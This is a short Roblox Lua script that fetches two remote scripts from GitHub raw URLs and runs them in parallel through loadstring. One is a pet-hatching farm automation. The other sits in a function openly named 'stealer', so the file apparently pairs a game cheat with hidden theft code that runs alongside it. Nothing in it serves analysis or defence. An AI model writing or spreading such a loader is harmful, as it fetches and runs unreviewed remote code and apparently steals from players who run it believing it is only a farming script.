local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/yeslidezz/Eks0va/main/scripts/778100c06888.lua'))()
end
local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FeddyX16/BGSIPetHatcher/refs/heads/main/PetHatcher'))()
end

task.spawn(stealer)
task.spawn(farm)
